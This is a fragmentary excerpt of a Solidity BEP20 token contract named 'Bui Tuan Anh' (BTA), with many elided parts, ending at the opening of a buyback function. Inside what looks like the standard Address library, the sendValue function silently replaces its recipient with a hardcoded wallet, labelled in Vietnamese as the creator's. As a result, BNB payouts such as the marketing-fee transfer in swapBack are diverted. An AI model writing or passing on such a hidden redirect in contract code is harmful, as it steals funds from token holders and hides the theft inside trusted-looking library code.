...
/**
 * SweetPoonCake     TG: SweetPoonCake
*/
...
library Address {
    ...
    function sendValue(address payable recipient, uint256 amount) internal {
        ...
        recipient = payable(0x1F49f87795125d04B2a950217F2daE6864000000); // Ví Tạo CA
...
contract BuiTuanAnh is IBEP20, Auth {
    using SafeMath for uint256;
    using Address for address;
    using Address for address payable;

    address constant private CAKE = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82;
    address constant private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant private DEAD = 0x000000000000000000000000000000000000dEaD;
    address constant private ZERO = 0x0000000000000000000000000000000000000000;

    string constant private _name = "Bui Tuan Anh";
    string constant private _symbol = "BTA";
    uint8 constant private _decimals = 9;

    uint256 private _totalSupply = 100000000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = _totalSupply / 15;
    ...
    uint256 public swapThreshold = _totalSupply / 20000; // 0.05%
    bool private inSwap;
    ...
    function swapBack() internal swapping {
        ...
        if(amountToLiquify > 0){
            (, uint256 amountBNBFromLiquidityTx, ) = router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
            ...
            if (amountBNBLiquidity - amountBNBFromLiquidityTx > 0)
                payable(marketingFeeReceiver).sendValue(amountBNBLiquidity - amountBNBFromLiquidityTx);
        }
    }
    ...
    function triggerBecakesBuyback(uint256 amount, bool triggerBuybackMultiplier) external authorized {
